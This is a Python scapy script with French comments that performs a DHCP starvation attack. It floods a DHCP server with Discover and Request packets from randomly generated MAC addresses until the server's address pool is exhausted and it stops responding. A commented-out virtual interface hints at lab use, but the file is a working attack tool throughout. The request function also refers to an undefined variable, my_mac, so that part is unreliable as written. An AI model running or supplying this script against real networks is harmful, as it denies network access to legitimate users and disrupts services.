from scapy.all import *
import random

#conf.iface = 'virbr1' # !!sur le PC!! Car sinon il balance les trames dans la mauvaise interface :)

# Fonction récupéré dans le code source de scapy
def mac2str(mac):
    # type: (str) -> bytes
    return b"".join(chb(int(x, 16)) for x in plain_str(mac).split(':'))

## Craft DHCP discover :
def craft_dhcp_discover(fake_mac):
    frame = Ether(dst="ff:ff:ff:ff:ff:ff") # Mac source doit être randomisé
    packet = IP(src="0.0.0.0", dst="255.255.255.255")
    udp = UDP(sport=68, dport=67)
    bootTP = BOOTP(chaddr=mac2str(fake_mac), xid=RandInt(), flags="B") # chaddr => fournis l'address MAC du client
    dhcp_packet = DHCP(options=[("message-type", "discover"), "end"])
        #("client_id",b'\x01' + mac2str(false_MAC)), # Ne semble pas nécessaire
    return frame/packet/udp/bootTP/dhcp_packet

## Craft DHCP request :
def craft_dhcp_request(fake_mac,requested_ip):
    frame = Ether(dst="ff:ff:ff:ff:ff:ff", src=my_mac) # Mac source doit être randomisé
    packet = IP(src="0.0.0.0", dst="255.255.255.255")
    udp = UDP(sport=68, dport=67)
    bootTP = BOOTP(chaddr=mac2str(fake_mac), xid=RandInt(), flags="B")
    dhcp_packet = DHCP(options=[("message-type", "request"),
        ("requested_addr", requested_ip),
        "end"])
    return frame/packet/udp/bootTP/dhcp_packet

# les charactères possible dans une address MAC
hex_list = ['a','b','c','d','e','f',0,1,2,3,4,5,6,7,8,9]

dhcp_is_full=False
while not dhcp_is_full:
    # Créer une address MAC random
    fake_mac_as_list = [str(random.choice(hex_list)) + str(random.choice(hex_list)) for n in range(6)]
    fake_mac = ":".join(fake_mac_as_list)

    # Envoi de la requête Discover
    sendp(craft_dhcp_discover(fake_mac),verbose=False)

    # Sniff dans l'attente de la réponse requête Offer
    offer_ip=0
    while True:
        sniffeur = sniff(count=1, filter="udp and (port 67 or 68)", timeout=3)
        if len(sniffeur) == 0:
            print("Le serveur DHCP est plein, il ne répond plus aux requêtes Discover")
            dhcp_is_full=True
            break
        if DHCP in sniffeur[0]:
            if sniffeur[0][DHCP].options[0][1] == 2: # => 2 = code pour DHCP type Offer 
                # Récupération de l'IP fournis dans la requête Offer
                offer_ip = sniffeur[0][BOOTP].yiaddr # => récupère l'IP offert par le DHCP
                break

    # Envoi requête Request en utilisant l'IP fournis
    if not dhcp_is_full:
        sendp(craft_dhcp_request(fake_mac,offer_ip),verbose=False)